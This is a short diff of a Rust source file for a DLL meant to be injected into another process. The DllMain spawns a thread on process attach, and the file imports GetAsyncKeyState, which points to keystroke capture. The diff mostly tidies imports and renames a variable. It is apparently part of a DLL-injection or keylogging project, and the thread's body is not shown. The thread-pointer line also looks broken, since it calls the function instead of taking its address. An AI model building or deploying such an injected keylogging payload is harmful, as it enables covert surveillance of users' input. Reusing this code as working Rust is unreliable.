@@ -1,17 +1,17 @@
 use winapi::{
         um::{
-        winuser::{MB_OK, MB_ICONINFORMATION, GetAsyncKeyState}, 
-        winnt::DLL_PROCESS_ATTACH,
-        processthreadsapi::CreateThread,
-        minwinbase::{LPTHREAD_START_ROUTINE, SECURITY_ATTRIBUTES},
-        
-    }, 
+            winuser::GetAsyncKeyState, 
+            winnt::DLL_PROCESS_ATTACH,
+            processthreadsapi::CreateThread,
+            minwinbase::SECURITY_ATTRIBUTES,
+        }, 
     shared::basetsd::DWORD_PTR
 };
 use winapi::shared::ntdef::NULL;
 use winapi::shared::minwindef::LPVOID;
 
 // used for testing if injector worked
+// winapi::um::winuser::{MB_OK, MB_ICONINFORMATION,
 // use user32::MessageBoxA;
 // use std::ffi::CString;
 
@@ -30,9 +30,9 @@ fn injected_thread() {
 }
 
 #[no_mangle]
-extern "system" fn DllMain(_: *const u8, fwdReason: u32, _: *const u8 ) -> u32 {
+extern "system" fn DllMain(_: *const u8, fwd_reason: u32, _: *const u8 ) -> u32 {
     unsafe {
-        if fwdReason == DLL_PROCESS_ATTACH {
+        if fwd_reason == DLL_PROCESS_ATTACH {
             let lpthread_start = Some(*(&injected_thread() as *const _ as *const unsafe extern "system" fn(LPVOID) -> u32));
             CreateThread(0 as *mut SECURITY_ATTRIBUTES, 0, lpthread_start, NULL, 0, 0 as *mut u32);
         }
